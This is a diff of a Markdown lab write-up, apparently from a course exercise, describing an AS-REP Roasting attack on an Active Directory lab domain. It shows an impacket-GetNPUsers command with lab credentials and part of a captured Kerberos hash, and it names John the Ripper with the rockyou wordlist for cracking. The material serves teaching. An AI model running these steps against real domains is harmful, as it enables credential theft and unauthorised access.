@@ -101,7 +101,7 @@ As first attempt, we ask the DomainController the list of all accounts that can 
     `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request`
      `-format john`
 
-	From the output, we copy the string referring to the desired account (*as shown below*) in a **`.txt` file**.
+	From the output, we copy the string referring to the desired account (*as shown below*) in a **text file** called usernamex.txt and placed on the desktop `./Desktop/usernames.txt`.
 	
 	   `$krb5asrep$DNSoperator@CYBERSEC.UNITS.IT:8690a5aa5b288a036a49126539f292ef$afe3e87aafc
 	    35690745c5dfeb1f459dcc1ed858f1f4755d3aefa12921c93dbc35b35c0fd6094be7390eab67e0c016f96
@@ -114,7 +114,7 @@ As first attempt, we ask the DomainController the list of all accounts that can 
  
  4. **Perform AS-Rep Roasting:**
  As said, we will now try to crack the password used for encoding the response obtained together with the TGT, performing a so-called AS-Rep Roasting attack.
-	For doing so, we will use **John the Ripper**, basing the offline-guessing activity on a password.
+	For doing so, we will use **John the Ripper**, basing the offline-guessing activity on a password dictionary called `rockyou`.
 	
 
  
@@ -131,10 +131,10 @@ As first attempt, we ask the DomainController the list of all accounts that can 
 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIwODUwMjkxOTksLTEwODczMzkyNDIsLT
-E4MTk4MTUyOTIsMjcxNzM0NDQ2LDkwNzAzMjc4LDE3MzYzOTc5
-NzIsMTIxMjI0NDE0MywxNTY1ODAwMjg3LC0yOTI1NDM5MzQsLT
-E0NDczODgzNjAsLTIwOTc2Nzg4NjMsMTA5NjE4MDExNSwtMTgx
-NDU3MjkwOCwtMjExMjAxMDU4OCwtNDcyODY5OTM3LC0xMjQ3Nz
-A2OTExXX0=
+eyJoaXN0b3J5IjpbMjY4Mzg2ODQ5LC0xMDg3MzM5MjQyLC0xOD
+E5ODE1MjkyLDI3MTczNDQ0Niw5MDcwMzI3OCwxNzM2Mzk3OTcy
+LDEyMTIyNDQxNDMsMTU2NTgwMDI4NywtMjkyNTQzOTM0LC0xND
+Q3Mzg4MzYwLC0yMDk3Njc4ODYzLDEwOTYxODAxMTUsLTE4MTQ1
+NzI5MDgsLTIxMTIwMTA1ODgsLTQ3Mjg2OTkzNywtMTI0NzcwNj
+kxMV19
 -->
